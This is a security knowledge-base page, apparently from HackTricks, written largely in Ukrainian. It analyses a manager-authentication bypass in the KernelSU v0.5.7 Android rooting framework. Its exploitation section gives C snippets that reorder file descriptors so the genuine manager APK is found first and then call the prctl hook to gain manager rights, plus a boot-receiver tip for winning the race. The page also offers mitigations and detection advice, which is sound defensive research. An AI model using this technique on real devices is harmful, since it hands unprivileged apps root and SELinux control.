# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks на кшталт KernelSU, APatch, SKRoot і Magisk часто патчать Linux/Android kernel і відкривають привілейовану функціональність для непривілейованого userspace-додатка-"manager" через hooked syscall. Якщо етап manager-authentication реалізовано некоректно, будь-який локальний app може отримати доступ до цього каналу та підвищити привілеї на вже rooted-пристроях.

Ця сторінка узагальнює техніки та недоліки, виявлені під час публічних досліджень (зокрема аналізу KernelSU v0.5.7 від Zimperium), щоб допомогти як red teams, так і blue teams зрозуміти attack surfaces, exploitation primitives і надійні mitigations.

---
## Архітектурний шаблон: syscall-hooked manager channel

- Kernel module/patch встановлює hook на syscall (зазвичай prctl), щоб отримувати "commands" із userspace.
- Протокол зазвичай має такий вигляд: magic_value, command_id, arg_ptr/len ...
- Userspace manager app спочатку проходить authentication (наприклад, CMD_BECOME_MANAGER). Після того як kernel позначає caller як trusted manager, приймаються privileged commands:
- Надати caller root (наприклад, CMD_GRANT_ROOT)
- Керувати allowlists/deny-lists для su
- Змінювати SELinux policy (наприклад, CMD_SET_SEPOLICY)
- Отримувати version/configuration
- Оскільки будь-який app може викликати syscalls, коректність manager authentication є критично важливою.

Приклад (дизайн KernelSU):
- Hooked syscall: prctl
- Magic value для перенаправлення до KernelSU handler: 0xDEADBEEF
- Commands включають: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT тощо.

---
## Authentication flow KernelSU v0.5.7 (як реалізовано)

Коли userspace викликає prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU перевіряє:

1) Перевірка prefix path
- Вказаний path має починатися з очікуваного prefix для caller UID, наприклад /data/data/<pkg> або /data/user/<id>/<pkg>.
- Reference: логіка перевірки path prefix у core_hook.c (v0.5.7).

2) Перевірка ownership
- Власником path має бути caller UID.
- Reference: логіка перевірки ownership у core_hook.c (v0.5.7).

3) Перевірка APK signature через FD table scan
- Перебираються відкриті file descriptors calling process.
- Обирається перший file, path якого відповідає /data/app/*/base.apk.
- Виконується парсинг APK v2 signature і перевірка її відповідності official manager certificate.
- References: manager.c (перебирання FDs), apk_sign.c (APK v2 verification).

Якщо всі перевірки успішні, kernel тимчасово кешує UID manager і приймає privileged commands від цього UID, доки його не буде скинуто.

---
## Клас vulnerability: довіра до “першого matching APK” під час FD iteration

Якщо signature check прив’язана до "першого matching /data/app/*/base.apk", знайденого в process FD table, фактично перевіряється не власний package caller. Attacker може заздалегідь розмістити legitimately signed APK (справжнього manager) так, щоб він з’явився у FD list раніше за власний base.apk.

Ця trust-by-indirection дає змогу непривілейованому app impersonate manager без володіння signing key manager.

Ключові властивості, що експлуатуються:
- FD scan не пов’язує identity package caller; він лише pattern-matches рядки path.
- open() повертає найменший доступний FD. Закриваючи FDs із меншими номерами заздалегідь, attacker може контролювати ordering.
- Filter перевіряє лише те, що path відповідає /data/app/*/base.apk, але не те, що він відповідає встановленому package caller.

---
## Передумови атаки

- Пристрій уже rooted за допомогою vulnerable rooting framework (наприклад, KernelSU v0.5.7).
- Attacker може запускати довільний непривілейований code локально (Android app process).
- Справжній manager ще не пройшов authentication (наприклад, одразу після reboot). Деякі frameworks кешують manager UID після успіху; необхідно виграти race.

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps:
1) Побудувати valid path до data directory власного app, щоб задовольнити prefix і ownership checks.
2) Переконатися, що genuine KernelSU Manager base.apk відкрито на FD з меншим номером, ніж власний base.apk.
3) Викликати prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...), щоб пройти checks.
4) Виконати privileged commands, як-от CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY, щоб зберегти elevation.

Практичні примітки щодо step 2 (FD ordering):
- Визначити FD власного process для власного /data/app/*/base.apk, проходячи symlinks у /proc/self/fd.
- Закрити low FD (наприклад, stdin, fd 0) і спочатку відкрити legitimate manager APK, щоб він зайняв fd 0 (або будь-який index, менший за FD власного base.apk).
- Додати legitimate manager APK до свого app, щоб його path відповідав naive filter kernel. Наприклад, розмістити його в subpath, що відповідає /data/app/*/base.apk.

Приклади code snippets (Android/Linux, лише для ілюстрації):

Перерахування відкритих FDs для пошуку записів base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Примусити FD з меншим номером вказувати на легітимний APK менеджера:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Автентифікація Manager через hook prctl:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Після успішного виконання привілейовані команди (приклади):
- CMD_GRANT_ROOT: підвищити привілеї поточного процесу до root
- CMD_ALLOW_SU: додати ваш package/UID до allowlist для постійного su
- CMD_SET_SEPOLICY: налаштувати політику SELinux відповідно до можливостей framework

Порада щодо race/persistence:
- Зареєструйте receiver BOOT_COMPLETED в AndroidManifest (RECEIVE_BOOT_COMPLETED), щоб запускатися одразу після перезавантаження та спробувати пройти authentication до справжнього manager.

---
## Рекомендації щодо виявлення та mitigation

Для розробників framework:
- Прив’язуйте authentication до package/UID викликувача, а не до довільних FD:
- Визначайте package викликувача за його UID і перевіряйте його на відповідність signature встановленого package (через PackageManager), замість сканування FD.
- Якщо використовується лише kernel, застосовуйте стабільну identity викликувача (task creds) і перевіряйте її за стабільним джерелом істини, яким керує init/userspace helper, а не за FD процесу.
- Не використовуйте перевірки path-prefix як identity; викликувач може тривіально їм відповідати.
- Використовуйте challenge–response на основі nonce через channel і очищайте будь-яку кешовану identity manager під час boot або після ключових подій.
- За можливості розгляньте authenticated IPC на основі binder замість перевантаження generic syscalls.

Для defenders/blue team:
- Виявляйте наявність rooting frameworks і процесів manager; відстежуйте виклики prctl із підозрілими magic constants (наприклад, 0xDEADBEEF), якщо у вас є kernel telemetry.
- На керованих fleet блокуватйте або створюйте alert для boot receivers із ненадійних packages, які одразу після boot швидко надсилають привілейовані команди manager.
- Переконайтеся, що пристрої оновлено до patched версій framework; інвалідуйте кешовані manager IDs після оновлення.

Обмеження attack:
- Впливає лише на пристрої, які вже rooted за допомогою вразливого framework.
- Зазвичай потребує reboot/race window до authentication легітимного manager (деякі frameworks кешують UID manager до reset).

---
## Пов’язані нотатки щодо різних frameworks

- Authentication на основі password (наприклад, історичні builds APatch/SKRoot) може бути слабким, якщо passwords можна вгадати/bruteforce або якщо validations реалізовано з помилками.
- Authentication на основі package/signature (наприклад, KernelSU) є принципово сильнішим, але має бути прив’язане до фактичного викликувача, а не до непрямих артефактів, як-от FD scans.
- Magisk: CVE-2024-48336 (MagiskEoP) продемонструвала, що навіть зрілі ecosystems можуть бути вразливими до identity spoofing, що призводить до code execution із root у контексті manager.

---
## References

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
